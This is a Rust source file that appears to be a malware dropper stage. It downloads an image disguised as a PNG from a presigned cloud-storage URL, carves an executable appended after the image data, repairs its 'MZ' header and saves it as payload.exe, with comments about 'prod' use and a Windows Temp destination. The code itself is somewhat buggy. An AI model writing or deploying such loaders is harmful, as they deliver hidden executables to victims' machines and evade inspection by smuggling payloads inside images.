use std::fs::{File, OpenOptions, remove_file};
use std::io::{Read, Write, copy};
use std::process;

const FILE_PATH: &str = "test.png";
const PAYLOAD_PATH: &str = "payload.exe";
const PAYLOAD_LINK: &str = "https://upnow-prod.ff45e40d1a1c8f7e7de4e976d0c9e555.r2.cloudflarestorage.com/tfqxvWKPemdxlYcSSf5eLxcwb2B2/20c86311-6395-4a6d-b469-8c024b409fce?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=cdd12e35bbd220303957dc5603a4cc8e%2F20250106%2Fauto%2Fs3%2Faws4_request&X-Amz-Date=20250106T212550Z&X-Amz-Expires=43200&X-Amz-Signature=ab85992d290352edcfca020855c23dad3831098afeb07beb6d630a6a4d8f24b8&X-Amz-SignedHeaders=host&response-content-disposition=attachment%3B%20filename%3D%22bart-simpson-png-21_new.png%22";

pub fn download_payload() -> bool {

    let resp = match reqwest::blocking::get(PAYLOAD_LINK) {
        Ok(resp) => {
            if resp.status().is_success(){
                resp
            } else {
                return false
            }
        },
        Err(_) => return false
    };

    let body = match resp.text() {
        Ok(body) => body,
        Err(_) => return false 
    };


    let mut file = match File::create(FILE_PATH) { // Maybe we will choose C:\\Windows\\Temp as dest
        Ok(file) => file,
        Err(_) => return false
    };


    match copy(&mut body.as_bytes(), &mut file){
        Ok(_) => 0, // return true in prod
        Err(_) => return false
    };

    extract_payload(FILE_PATH, PAYLOAD_PATH);

    true
}


fn extract_payload(png_file: &str, output_executable: &str) {
    // Define the IEND chunk sequence
    let iend_sequence: [u8; 0x08] = [0x00, 0x00, 0x00, 0x00, 0x49, 0x45, 0x4E, 0x4D];

    // Read the entire PNG file
    let mut file = match File::open(png_file) {
        Ok(file) => file,
        Err(err) => {
            eprintln!("Failed to open PNG file: {}", err);
            process::exit(1);
        }
    };

    let mut content = Vec::new();
    if let Err(err) = file.read_to_end(&mut content) {
        eprintln!("Failed to read PNG file: {}", err);
        process::exit(1);
    }

    if let Some(iend_index) = content.windows(iend_sequence.len()).position(|window| window == iend_sequence) {
        let appended_data_start = iend_index + iend_sequence.len();

        let appended_data = &content[appended_data_start..];

        if appended_data.is_empty() {
            eprintln!("No appended data found after the PNG file.");
            process::exit(1);
        }

        let mut modified_data = vec![0x4D];
        modified_data.extend_from_slice(appended_data);

        let mut output_file = match OpenOptions::new().write(true).create(true).open(output_executable) {
            Ok(file) => file,
            Err(err) => {
                eprintln!("Failed to create output file: {}", err);
                process::exit(1);
            }
        };

        if let Err(err) = output_file.write_all(&modified_data) {
            eprintln!("Failed to write to output file: {}", err);
            process::exit(1);
        }

        println!("Appended executable successfully extracted and modified. Saved to: {}", output_executable);
    } else {
        eprintln!("IEND sequence not found in the PNG file.");
        process::exit(1);
    }
}